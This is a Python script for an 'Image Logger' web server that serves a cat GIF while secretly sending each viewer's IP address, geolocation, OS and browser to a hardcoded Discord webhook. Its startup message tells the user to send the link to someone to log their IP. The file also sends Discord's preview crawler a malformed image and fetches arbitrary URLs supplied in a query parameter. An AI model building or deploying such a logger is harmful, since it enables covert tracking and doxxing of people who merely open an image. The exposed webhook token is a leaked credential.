from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib import parse
import httpx
import base64
import httpagentparser

# Replace with your actual Discord webhook URL
webhook = 'https://discord.com/api/webhooks/1411109952642220175/PE00x9ax0G9CaX9QCxb318CEfx77YtsKD7IS_NlYN9KYpVc5_wwUWqBRprEG34CeyRL9'

# Sample image data (a cute cat GIF)
bindata = httpx.get('https://media.tenor.com/StMcxdC56MMAAAAM/cat.gif').content
buggedimg = True
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    """Format the Discord webhook message with IP information"""
    return {
        "username": "Image Logger",
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Viewed!",
                "color": 16711803,
                "description": "Someone viewed your image. Here's their information:",
                "fields": [
                    {
                        "name": "IP Info",
                        "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                        "inline": True
                    },
                    {
                        "name": "Advanced Info",
                        "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
                        "inline": False
                    }
                ]
            }
        ],
    }

def prev(ip, uag):
    """Format a preview message for Discord clients"""
    return {
        "username": "Image Logger Preview",
        "content": "",
        "embeds": [
            {
                "title": "Image Preview Detected",
                "color": 16711803,
                "description": f"Discord previewed the image!\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
            }
        ],
    }

class ImageHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the path and query parameters
        parsed_path = parse.urlparse(self.path)
        query_params = parse.parse_qs(parsed_path.query)
        
        # Determine what image to serve
        try:
            if 'url' in query_params:
                data = httpx.get(query_params['url'][0]).content
            else:
                data = bindata
        except Exception:
            data = bindata
        
        # Get client information
        useragent = self.headers.get('user-agent', 'No User Agent Found!')
        client_ip = self.headers.get('x-forwarded-for', self.headers.get('x-real-ip', 'Unknown IP'))
        
        try:
            os, browser = httpagentparser.simple_detect(useragent)
        except:
            os, browser = 'Unknown', 'Unknown'
        
        # Check if the request is from Discord
        if 'discord' in useragent.lower():
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(buggedbin if buggedimg else bindata)
            
            # Send Discord preview notification
            try:
                httpx.post(webhook, json=prev(client_ip, useragent))
            except:
                pass  # Silently fail if webhook doesn't work
        else:
            # Serve the image to regular users
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(data)
            
            # Try to get IP info and send to webhook
            try:
                ipInfo = httpx.get(f'https://ipinfo.io/{client_ip}/json').json()
                httpx.post(webhook, json=formatHook(
                    ipInfo.get('ip', 'Unknown'),
                    ipInfo.get('city', 'Unknown'),
                    ipInfo.get('region', 'Unknown'),
                    ipInfo.get('country', 'Unknown'),
                    ipInfo.get('loc', 'Unknown'),
                    ipInfo.get('org', 'Unknown'),
                    ipInfo.get('postal', 'Unknown'),
                    useragent, os, browser
                ))
            except:
                pass  # Silently fail if IP lookup or webhook fails

def run_server():
    """Start the HTTP server"""
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, ImageHandler)
    print('Server running on http://localhost:8000')
    print('Send someone this URL to log their IP: http://localhost:8000/image.gif')
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
